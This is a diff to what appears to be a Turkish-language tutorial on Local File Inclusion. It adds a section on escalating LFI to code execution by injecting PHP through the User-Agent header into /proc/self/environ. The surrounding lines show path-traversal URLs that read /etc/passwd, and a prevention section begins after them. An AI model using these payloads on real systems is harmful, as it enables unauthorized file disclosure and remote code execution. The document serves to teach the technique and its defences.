@@ -50,6 +50,15 @@ http://example.com/index.php?page=..///////..////..//////etc/passwd
 http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 ```
 
+# LFI to RCE
+# /proc/self/environ üzerinden RCE
+Bir log dosyası gibi çalışır. Payload User-Agent header'ına gönderilirse, bu değer /proc/self/environ içinde yansıtılır.
+```
+GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
+User-Agent: <?=phpinfo(); ?>
+```
+
+
 # LFI Açığını Önlemek
 ### Input Validation & Whitelisting
 Kullanıcıdan gelen dosya adlarını direkt include etme. Sadece izin verilen dosyalar:
